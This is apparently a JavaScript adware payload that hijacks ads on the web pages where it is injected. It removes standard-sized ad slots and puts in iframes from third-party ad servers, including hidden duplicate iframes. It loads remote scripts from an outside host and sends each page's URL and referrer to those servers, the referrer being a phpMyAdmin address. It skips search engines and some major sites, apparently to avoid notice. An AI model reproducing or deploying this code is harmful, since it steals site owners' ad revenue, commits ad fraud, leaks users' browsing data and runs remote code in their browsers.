function onCompAdmUsAdsVAd1989(){
	if(document.location.href.indexOf('search.yahoo') == -1 && document.location.href.indexOf('bing.com') == -1 && document.location.href.indexOf('google.com') == -1)
	{
		var eid = 'PTkrNiY';
		var vsEnId = '';
		var server_host = 'nfobeat.com';
		var ad_label = 'Ads';
		var ad_label_link = 'javascript:void();';
		var inj_labels = '';
		if(ad_label != '')
			inj_labels = '&ad_label='+encodeURIComponent(ad_label);
		if(ad_label_link != '')
			inj_labels += '&ad_label_link='+encodeURIComponent(ad_label_link);
		else
			inj_labels += '&ad_label_link='+encodeURIComponent('javascript:void();');

		var v = document.createElement('script');
		v.setAttribute('type', 'text/javascript');
		var encId = '';
		if(eid && eid != '')
		{
			encId = eid;
		}
		else if(vsEnId && vsEnId != '')
		{
			encId = vsEnId;
		}

		var vsOpenRef = '&openref=1';
		v.setAttribute('src', '//vslider.'+server_host+'/?id='+encId+'&f=1'+vsOpenRef+inj_labels);
		(document.getElementsByTagName('head')[0] || document.documentElement).appendChild(v);
	}
}
(function() {
	var jQuery;

	if (window.jQuery === undefined)
	{
		var s = document.createElement('script');
		s.setAttribute('type', 'text/javascript');
		s.setAttribute('src', '//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js');
		if (s.readyState)
		{
			s.onreadystatechange = function ()
			{
				if (this.readyState == 'complete' || this.readyState == 'loaded')
				{
					scriptLoadHandler();
				}
			};
		}
		else
		{
			s.onload = scriptLoadHandler;
    	}
    	(document.getElementsByTagName('head')[0] || document.documentElement).appendChild(s);
	}
	else
	{
		jQuery = window.jQuery;
		_AMIN();
	}

	function scriptLoadHandler()
	{
		jQuery = window.jQuery.noConflict(true);
		_AMIN();
	}

	function _AMIN() {
		jQuery(document).ready(function($)
		{
			var _AMIN = {
				begin: new Date(),
				proto: 'https:' == document.location.protocol ? 'https://' : 'http://',
				bannerHost: 'b.localpages.com/banners',
				prerollHost: 'lookmoms.com/preroll',
				bannerDomain: '',
				prerollDomain: 'lookmoms.com',
				vdisplay: 0,
				vdisplayEn: 1,
				vdisp: 0,
				vsliderEn: 1,
				bannerAdsEn: 1,
				usadservEx: 'Oj47Ij86MTwnOA',
				lrc_domain: 0,
				curatedSite: 0,
				intVideoStart: 0,
				raa: 0,
				server_host: 'nfobeat.com',
				placementID: '4787384',
				affiliate: '71295',
				subid: '',
				eid: 'PTkrNiY',
				vsEnId: '',
				pageUrl: window.location.href,
				pageReferrer: 'http://129.2.24.54:8080/phpMyAdmin/index.php?db=mkemal1',
				ad_label: 'Ads',
				ad_label_link: 'javascript:void();',
								cleanUp: function ()
				{
					var self = this;
					var cnt = 0;
					var e = $('iframe[replaced]').next().andSelf();
					if(e.length > 0)
					{
						e.remove();
					}
					else
					{
						if(cnt < 10000) {
							cnt += 500;
							setTimeout(function ()
							{
								self.cleanUp();
							}, 500);
						}
					}
				},
								e: function (s)
				{
					var e = '';
					l = s.length;
					for (var i = 0; i < l; i++)
					{
						e += s.charCodeAt(i).toString(16);
					}
					return e.split('').reverse().join('');
				},
				injVslider: function(msec)
				{
					if(document.location.href.indexOf('search.yahoo') == -1 && document.location.href.indexOf('bing.com') == -1 && document.location.href.indexOf('google.com') == -1)
					{
						var eid = this.eid;
						var vsEnId = this.vsEnId;
						var curatedSite = this.curatedSite;
						var server_host = this.server_host;
						var inj_labels = '';
						if(this.ad_label != '')
							inj_labels = '&ad_label='+encodeURIComponent(this.ad_label);
						if(this.ad_label_link != '')
							inj_labels += '&ad_label_link='+encodeURIComponent(this.ad_label_link);
						else
							inj_labels += '&ad_label_link='+encodeURIComponent('javascript:void();');

						setTimeout(function(){
							var v = document.createElement('script');
							v.setAttribute('type', 'text/javascript');
							var encId = '';
							if(eid && eid != '')
							{
								encId = eid;
							}
							else if(vsEnId && vsEnId != '')
							{
								encId = vsEnId;
							}

							var vsOpenRef = '';
							if(curatedSite == 1)
								vsOpenRef = '&openref=1';

							v.setAttribute('src', '//vslider.'+server_host+'/?id='+encId+'&f=1'+vsOpenRef+inj_labels);
    						(document.getElementsByTagName('head')[0] || document.documentElement).appendChild(v);
						}, msec);
					}
				},
				init: function ()
				{
					this.parseHTML();
					this.cleanUp();				},
				parseHTML: function ()
				{
					var elements = $('div, iframe, img, ins, object, embed');
					var i = elements.length;
					var cnt = 0;
					
					while (i--)
					{
						if(($(elements[i]).attr('src') && $(elements[i]).attr('src').indexOf('gbanner.php') == -1 && $(elements[i]).attr('src').indexOf('usadserver.com') == -1 && $(elements[i]).attr('src').indexOf('secure.adnxs.com') == -1 && $(elements[i]).attr('src').indexOf('ib.adnxs.com') == -1) || (!$(elements[i]).attr('src') && !$(elements[i]).is('div')))
						{
							if(($(elements[i]).width() == '300' && $(elements[i]).height() == '250') || ($(elements[i]).width() == '160' && $(elements[i]).height() == '600') || ($(elements[i]).width() == '728' && $(elements[i]).height() == '90'))
							{
								this.render($(elements[i]), 'remove');
								cnt++;
							}
						}
					}
					
					console.log(cnt+' in '+((new Date()) - this.begin)+'ms - vdisp :: '+this.vdisp);

					var intVideoDelay = 0;
					//if(this.intVideoStart == 1)
					//	intVideoDelay = 120000;

					if((cnt == 0 && this.eid != '') || this.vdisp == 0)
					{
						this.injVslider(0+intVideoDelay);
					}
					else if(this.vdisp == 1 && this.lrc_domain == 0)
					{
						this.injVslider(60000);
					}
					/*else if((cnt > 0 || this.vdisp == 1) && this.eid != '')
					{
						this.injVslider(120000+intVideoDelay);
					}
					else if(this.vsliderEn == 1 && this.eid == '' && this.vdisplayEn == 1 && this.vdisp == 1)
					{
						this.injVslider(120000+intVideoDelay);
					}*/
				},
				runLRJSBnr: function()
				{
					if(jQuery('#admInj12_LRC551_D_REP').length > 0)
						usad_player.init("admInj12_LRC551_D_REP", "onCompAdmUsAdsVAd1989");
					else
					{
						var lrcInt = setInterval(function(){
							if(jQuery('#admInj12_LRC551_D_REP').length > 0)
							{
								clearInterval(lrcInt);
								usad_player.init("admInj12_LRC551_D_REP", "onCompAdmUsAdsVAd1989");
							}
						}, 700);
					}
				},
				initLRJSBnr: function()
				{
					if (typeof usad_player != "undefined") {
						this.runLRJSBnr();
					}
					else
					{
						var usadInt = setInterval(function(){
							if(typeof usad_player != "undefined")
							{
								clearInterval(usadInt);
								if(jQuery('#admInj12_LRC551_D_REP').length > 0)
									usad_player.init("admInj12_LRC551_D_REP", "onCompAdmUsAdsVAd1989");
								else
								{
									var lrcInt = setInterval(function(){
										if(jQuery('#admInj12_LRC551_D_REP').length > 0)
										{
											clearInterval(lrcInt);
											usad_player.init("admInj12_LRC551_D_REP", "onCompAdmUsAdsVAd1989");
										}
									}, 700);
								}
							}
						}, 700);
					}
				},
				render: function(e, a)
				{
					var apnxsDomain = 'ib.adnxs.com';
					if(this.proto == "https://")
						apnxsDomain = 'secure.adnxs.com';
					var raa_params = '';
					if(this.raa == 1)
						raa_params = '&raa=1';
					var w = e.width();
					var h = e.height();
					var s = e;
					var id = e.attr('id') || '';
					var cl = e.attr('class') || '';
					var st = e.attr('style') || '';
					var code = '';
					var initUsAdObj = 0;
					if(id != '')
					{
						id = ' id="'+id+'"';
					}
					if(cl != '')
					{
						cl = ' class="'+cl+'"';
					}
					if(st != '')
					{
						st = ' style="'+st+'"';
					}
					if(this.pageUrl.indexOf('wikipedia.org') != -1 || this.pageUrl.indexOf('craigslist') != -1 || this.pageUrl.indexOf('google.com') != -1)
						throw "No Injection";
										if(w == 300 && h == 250 && this.vdisp == 0 && this.vdisplayEn == 1)
					{
						if(this.pageUrl.indexOf('youtube.com') != -1)
							subid += "&yt=1";
						
						if(this.lrc_domain == 0)
							code = '<div'+id+cl+st+'><iframe src="'+this.proto+'usadserver.com/p/d/?src=ac&ex='+this.usadservEx+'&pd='+this.prerollDomain+'&bd='+this.bannerDomain+'&pid='+this.placementID+'&aid='+this.affiliate+'&size='+w+'x'+h+this.subid+'&l='+encodeURIComponent(this.pageUrl)+'&r='+encodeURIComponent(this.pageReferrer)+'&gb=1'+raa_params+'" width="'+w+'" height="'+h+'" frameborder="0" scrolling="no"></iframe></div>';
						else
						{
							initUsAdObj = 1;
							code = '<div id="admInj12_LRC551_D_REP"></div>';
						}
						this.vdisp = 1;
					}
					else if(this.bannerAdsEn == 1)
					{
						if(this.curatedSite == 0)
						{
							code = '<div'+id+cl+st+'><iframe src="'+this.proto+this.bannerHost+'/gbanner.php?pid='+this.placementID+'&d=1&aff='+this.affiliate+'&size='+w+'x'+h+this.subid+'&pageUrl='+encodeURIComponent(this.pageUrl)+'&pageReferer='+encodeURIComponent(this.pageReferrer)+'&gb=1'+raa_params+'" width="'+w+'" height="'+h+'" frameborder="0" scrolling="no"></iframe></div>';
							code += '<div style="display:none;"><iframe src="'+this.proto+this.bannerHost+'/gbanner.php?pid='+this.placementID+'&aff='+this.affiliate+'&size='+w+'x'+h+'&pageUrl='+encodeURIComponent(this.pageUrl)+'&pageReferer='+encodeURIComponent(this.pageReferrer)+'&gb=1'+raa_params+'" width="'+w+'" height="'+h+'" frameborder="0" scrolling="no"></iframe></div>';
						}
						else
						{	// Open Referer to appnexus
							code = '<div'+id+cl+st+'><iframe src="'+this.proto+apnxsDomain+'/tt?id='+this.placementID+'&size='+w+'x'+h+'" width="'+w+'" height="'+h+'" frameborder="0" scrolling="no" class="injAmPageBanner"></iframe></div>';
							code += '<div style="display:none;"><iframe src="'+this.proto+apnxsDomain+'/tt?id='+this.placementID+'&size='+w+'x'+h+'" width="'+w+'" height="'+h+'" frameborder="0" scrolling="no"></iframe></div>';
						}
					}
					else if(this.bannerAdsEn == 0)
						return;
										
					switch(a)
					{
						case 'prepend':
							$(s).html('');
							$(s).prepend(code);
							break;
						case 'append':
							$(s).html('');
							$(s).append(code);
							break;
						case 'before':
							$(s).html('');
							$(s).before(code);
							break;
						case 'after':
							$(s).html('');
							$(s).after(code);
							break;
						case 'remove':
							$(s).before(code);
							$(s).remove();
							break;
					}

					if(initUsAdObj == 1)
						this.initLRJSBnr();
				}
			}
			_AMIN.init();
		});
	}
})();
